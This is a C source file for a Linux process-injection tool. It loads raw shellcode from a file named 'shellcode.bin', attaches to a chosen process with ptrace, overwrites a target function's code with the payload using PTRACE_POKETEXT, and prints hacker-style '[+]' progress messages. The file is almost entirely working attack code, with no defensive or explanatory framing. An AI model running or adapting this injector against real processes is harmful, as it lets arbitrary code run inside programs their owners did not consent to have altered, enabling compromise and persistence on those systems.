#include "../include/lib.h"

static unsigned char* get_shellcode(info_t *inf) {
    int fd = open("shellcode.bin", O_RDONLY);
    if (fd == -1) {
        put(2, "Error: Failed to open file\n");
        return NULL;
    }

    off_t file_size = lseek(fd, 0, SEEK_END);
    inf->size_shellcode = file_size;
    lseek(fd, 0, SEEK_SET);

    unsigned char* buffer = (unsigned char*)malloc(file_size);
    if (buffer == NULL) {
        close(fd);
        put(2, "Error: Failed to allocate memory\n");
        return NULL;
    }

    ssize_t read_size = read(fd, buffer, file_size);
    if (read_size != file_size) {
        close(fd);
        free(buffer);
        put(2, "Error: Failed to read file\n");
        return NULL;
    }
    close(fd);
    return buffer;
}

static int inject_data(pid_t pid, unsigned char* src, void* dst, int len)
{
    int i;
    uint32_t* s = (uint32_t*)src; // Cast the source pointer to uint32_t*
    uint32_t* d = (uint32_t*)dst; // Cast the destination pointer to uint32_t*

    for (i = 0; i < len; i += 4, s++, d++) {
        // Iterate through the data in 4-byte chunks

        if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0) {
            // Utilise ptrace pour écrire la valeur pointée par s (buffer)
            // dans l'adresse mémoire pointée par d (l'adresse de la fonction) dans le processus cible
            put(2, "error: Injection Failed ptrace(POKETEXT)");
            return 0;
        }
    }
    return 1;
}

extern int injection(info_t *inf)
{
    pid_t target = atoi(inf->pid);
    int syscall;
    char *buffer = NULL;

    printf("[+] Base adress at %p\n[+] Function offset at %p\n[+] Function adress at %p\n",
    (void*)inf->base_addr, (void*)inf->function_offset, (void*)inf->function_adress);
    printf("[+] Attach process %d\n", target);

    if ((ptrace(PTRACE_ATTACH, target, NULL, NULL)) < 0) {
        put(2, "error: attaching process ptrace(ATTACH)\n");
        return 0;
    }

    printf("[+] Waiting for process...\n");
    wait(NULL);

    // U can also use PTRACE_GETREGS to get the registers of the target process
    // And after using reg.rip to get the current instruction pointer

    printf("[+] Injecting ShellCode at %p\n", (void*)inf->function_adress);

    if (!(buffer = get_shellcode(inf)) ||
    !inject_data(target, buffer, (void*)inf->function_adress, inf->size_shellcode))
        return 0;

    free(buffer);

    printf("[+] Injected!\n");
    if ((ptrace(PTRACE_DETACH, target, NULL, NULL)) < 0) {
        put(2, "ptrace(DETACH)\n");
        return 0;
    }

    return 1;
}
